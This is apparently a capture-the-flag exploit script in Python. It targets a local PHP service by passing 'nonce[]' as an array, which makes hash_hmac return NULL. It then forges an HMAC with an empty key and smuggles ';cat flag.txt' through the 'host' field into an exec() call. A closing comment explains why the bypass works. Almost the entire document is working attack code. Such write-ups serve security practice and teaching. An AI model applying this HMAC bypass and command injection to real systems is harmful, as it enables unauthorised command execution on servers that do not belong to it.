#!/usr/bin/env python

import requests
import re
import hmac
import hashlib

url = 'http://localhost:8000'
remote_command = 'cat flag.txt'

full_command = ';{}'.format(remote_command).encode('utf-8')
hmac_val = hmac.new(b'', full_command, hashlib.sha256).hexdigest()

payload = {
    'hmac': hmac_val,
    'host': full_command,
    'nonce[]': '', # triggers the exploit. Sets nonce to be an array
}

response = requests.post(url, data=payload)
data = response.text.replace('\n', ' ')

flag = re.search('on line <b>[0-9]+</b><br /> (.*)', data).group(1)
print(flag)

# this exploit works because hash_hmac returns NULL and doesn't error
# if it is given an incorrect data type. In this case we are
# supplying it with an array. This triggers hash_hmac to return
# NULL which sets $secret to NULL which allows us to determine the
# hash of anything and thus run arbitrary commands through the exec() call
